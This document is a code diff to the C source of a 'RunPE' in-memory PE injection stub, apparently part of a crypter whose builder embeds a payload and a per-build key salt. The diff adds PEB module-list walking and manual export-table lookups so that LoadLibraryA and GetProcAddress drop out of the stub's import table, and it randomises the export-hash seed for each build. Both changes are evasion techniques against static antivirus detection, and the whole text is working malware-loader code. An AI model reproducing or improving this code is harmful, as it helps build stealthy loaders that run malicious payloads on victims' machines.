@@ -26,11 +26,10 @@
 #define RELOC_32BIT_FIELD   3
 #define RELOC_64BIT_FIELD   10
 
-/* Fixed seed shared with Builder for export hash computation.
- * Intentionally separate from the compile-time random seed used by ApiHashing.cpp
- * (which hides the Stub's own API lookups). This seed must remain stable across
- * builds so Builder and Stub always agree on the same hash value. */
-#define FIXED_DJB2_SEED     0xDEADC0DE
+/* Export hash seed is no longer a fixed compile-time constant.
+ * The seed is key_salt[0] — a per-build CryptGenRandom DWORD already in .rsrc.
+ * Builder computes exportHash = Djb2(name, key_salt[0]) and stores it.
+ * Stub reads key_salt[0] before zeroing it and passes it to RunPE(). */
 
 typedef BOOL  (WINAPI* DLLMAIN_T)(HINSTANCE, DWORD, LPVOID);
 typedef VOID  (NTAPI*  TLS_CALLBACK_T)(PVOID, DWORD, PVOID);
@@ -47,8 +46,105 @@ extern void* __cdecl memcpy(void*, const void*, size_t);
 extern void* __cdecl memset(void*, int, size_t);
 
 
-static DWORD FixedDjb2A(const char* s) {
-    DWORD h = FIXED_DJB2_SEED;
+/* ============================================================
+ *  IAT resolution helpers — no Win32 API surface
+ *
+ *  These three static functions replace LoadLibraryA + GetProcAddress
+ *  so that neither appears in stub.bin's import table or call sites.
+ *
+ *  RUNPE_LDR_ENTRY lays out the fields of LDR_DATA_TABLE_ENTRY
+ *  starting from InMemoryOrderLinks (the field linked by
+ *  PEB_LDR_DATA.InMemoryOrderModuleList).  Offsets on x64:
+ *    +0x00  InMemoryLinks  (LIST_ENTRY, 16B)
+ *    +0x10  _rsv1[2]       (covers InInitializationOrderLinks, 16B)
+ *    +0x20  DllBase        (PVOID, 8B)
+ *    +0x28  EntryPoint     (PVOID, 8B)
+ *    +0x30  _rsv3          (absorbs SizeOfImage + 4B pad, 8B)
+ *    +0x38  FullName       (UNICODE_STRING, 16B)
+ *    +0x48  BaseName       (UNICODE_STRING, 16B)
+ * ============================================================ */
+typedef struct _RUNPE_LDR_ENTRY {
+    LIST_ENTRY     InMemoryLinks;
+    PVOID          _rsv1[2];
+    PVOID          DllBase;
+    PVOID          EntryPoint;
+    PVOID          _rsv3;
+    UNICODE_STRING FullName;
+    UNICODE_STRING BaseName;
+} RUNPE_LDR_ENTRY, *PRUNPE_LDR_ENTRY;
+
+/* Case-insensitive ASCII-vs-wide comparison (module name lookup). */
+static BOOL RunPE_NameMatchI(const char* a, const WCHAR* w) {
+    while (*a && *w) {
+        char   ca = *a; if (ca >= 'A' && ca <= 'Z') ca = (char)(ca + 32);
+        WCHAR  cw = *w; if (cw >= L'A' && cw <= L'Z') cw = (WCHAR)(cw + 32);
+        if ((WCHAR)ca != cw) return FALSE;
+        a++; w++;
+    }
+    return (*a == '\0' && *w == L'\0');
+}
+
+/* Walk PEB InMemoryOrderModuleList — no API call. */
+static HMODULE RunPE_GetModule(const char* dllNameA) {
+#if defined(_M_X64)
+    PPEB pPeb = (PPEB)__readgsqword(0x60);
+#else
+    PPEB pPeb = (PPEB)__readfsdword(0x30);
+#endif
+    PPEB_LDR_DATA pLdr  = pPeb->Ldr;
+    PLIST_ENTRY   pHead = &pLdr->InMemoryOrderModuleList;
+    PLIST_ENTRY   pCur  = pHead->Flink;
+    while (pCur != pHead) {
+        PRUNPE_LDR_ENTRY e = CONTAINING_RECORD(pCur, RUNPE_LDR_ENTRY, InMemoryLinks);
+        if (e->BaseName.Buffer && RunPE_NameMatchI(dllNameA, e->BaseName.Buffer))
+            return (HMODULE)e->DllBase;
+        pCur = pCur->Flink;
+    }
+    return NULL;
+}
+
+/* Walk module export directory by exact name — replaces GetProcAddress. */
+static FARPROC RunPE_GetExport(HMODULE hMod, const char* funcName) {
+    PBYTE pBase = (PBYTE)hMod;
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
+    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
+    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
+    IMAGE_DATA_DIRECTORY exp = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+    if (!exp.Size || !exp.VirtualAddress) return NULL;
+    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(pBase + exp.VirtualAddress);
+    PDWORD pNames = (PDWORD)(pBase + pExp->AddressOfNames);
+    PDWORD pFuncs = (PDWORD)(pBase + pExp->AddressOfFunctions);
+    PWORD  pOrds  = (PWORD) (pBase + pExp->AddressOfNameOrdinals);
+    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
+        const char* en = (const char*)(pBase + pNames[i]);
+        const char* fn = funcName;
+        while (*en && *fn && *en == *fn) { en++; fn++; }
+        if (*en == *fn)
+            return (FARPROC)(pBase + pFuncs[pOrds[i]]);
+    }
+    return NULL;
+}
+
+/* Load a DLL: check PEB first, then call LoadLibraryW found via export walk.
+ * Removes LoadLibraryA from stub.bin's IAT — LoadLibraryW is resolved
+ * dynamically so only LoadLibraryW's address is touched, not imported. */
+typedef HMODULE (WINAPI *RunPE_pfnLoadLibW)(LPCWSTR);
+static HMODULE RunPE_LoadDll(const char* dllNameA) {
+    HMODULE hMod = RunPE_GetModule(dllNameA);
+    if (hMod) return hMod;
+    HMODULE hK32 = RunPE_GetModule("kernel32.dll");
+    if (!hK32) return NULL;
+    RunPE_pfnLoadLibW pLLW = (RunPE_pfnLoadLibW)RunPE_GetExport(hK32, "LoadLibraryW");
+    if (!pLLW) return NULL;
+    WCHAR w[64]; int i = 0;
+    while (dllNameA[i] && i < 63) { w[i] = (WCHAR)(unsigned char)dllNameA[i]; i++; }
+    w[i] = L'\0';
+    return pLLW(w);
+}
+
+
+static DWORD FixedDjb2A(const char* s, DWORD seed) {
+    DWORD h = seed;
     int   c;
     if (!s) return 0;
     while ((c = *s++)) h = ((h << 5) + h) + c;
@@ -56,9 +152,8 @@ static DWORD FixedDjb2A(const char* s) {
 }
 
 /* Walks the export table of an already-mapped PE and returns the function address
- * whose exported name hashes to exportHash (FIXED_DJB2_SEED seed).
- * Returns NULL if no match is found or the PE has no export directory. */
-static FARPROC FindExportByFixedHash(PBYTE pBase, DWORD exportHash) {
+ * whose exported name hashes to exportHash using the provided per-build seed. */
+static FARPROC FindExportByHash(PBYTE pBase, DWORD exportHash, DWORD seed) {
     PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
     PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
 
@@ -74,7 +169,7 @@ static FARPROC FindExportByFixedHash(PBYTE pBase, DWORD exportHash) {
 
     for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
         const char* pName = (const char*)(pBase + pNames[i]);
-        if (FixedDjb2A(pName) == exportHash)
+        if (FixedDjb2A(pName, seed) == exportHash)
             return (FARPROC)(pBase + pFunctions[pOrdinals[i]]);
     }
     return NULL;
@@ -99,7 +194,7 @@ static BOOL FixImportAddressTable(PBYTE pPeBase, PIMAGE_NT_HEADERS pNtHdrs) {
 
     while (pDesc->OriginalFirstThunk || pDesc->FirstThunk) {
         LPCSTR  dllName = (LPCSTR)(pPeBase + pDesc->Name);
-        HMODULE hDll    = LoadLibraryA(dllName);
+        HMODULE hDll    = RunPE_LoadDll(dllName);
         if (!hDll) {
             return FALSE;
         }
@@ -125,7 +220,7 @@ static BOOL FixImportAddressTable(PBYTE pPeBase, PIMAGE_NT_HEADERS pNtHdrs) {
                 /* Import by name */
                 PIMAGE_IMPORT_BY_NAME pByName =
                     (PIMAGE_IMPORT_BY_NAME)(pPeBase + pOrig->u1.AddressOfData);
-                fnAddr = GetProcAddress(hDll, pByName->Name);
+                fnAddr = RunPE_GetExport(hDll, pByName->Name);
             }
 
             if (fnAddr) {
@@ -234,7 +329,7 @@ static BOOL FixMemPermissions(PBYTE pPeBase, PIMAGE_NT_HEADERS pNtHdrs) {
 /* ============================================================
  *  RunPE – main function: Local PE Injection
  * ============================================================ */
-DWORD RunPE(BYTE* pPeFile, DWORD exportHash, LPCSTR pExportArg, void (*PreExecuteCb)(void)) {
+DWORD RunPE(BYTE* pPeFile, DWORD exportHash, DWORD exportSeed, LPCSTR pExportArg, void (*PreExecuteCb)(void)) {
     if (!pPeFile) return 101;
 
     /* 1. Parse headers */
@@ -370,7 +465,7 @@ DWORD RunPE(BYTE* pPeFile, DWORD exportHash, LPCSTR pExportArg, void (*PreExecut
         /* Optionally invoke a named export identified by its fixed-seed Djb2 hash.
          * exportHash == 0 means no export call was requested (EXE payloads also skip this). */
         if (exportHash != 0) {
-            FARPROC pExport = FindExportByFixedHash(pBase, exportHash);
+            FARPROC pExport = FindExportByHash(pBase, exportHash, exportSeed);
             if (pExport) {
                 EXPORT_FUNC_T pFunc = (EXPORT_FUNC_T)pExport;
                 /* Pass the arg string if non-empty, otherwise NULL */
